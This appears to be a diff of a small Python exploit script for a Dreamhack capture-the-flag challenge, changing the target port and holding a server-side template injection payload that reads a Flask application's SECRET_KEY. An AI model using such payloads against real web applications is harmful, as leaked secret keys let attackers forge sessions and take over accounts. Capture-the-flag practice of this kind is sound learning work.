@@ -1,7 +1,7 @@
 import requests
 from bs4 import BeautifulSoup as bs
 
-URL = "http://host3.dreamhack.games:8805"
+URL = "http://host3.dreamhack.games:12193"
 URI = "/"
 PAYLOAD = "{{config['SECRET_KEY']}}"
 
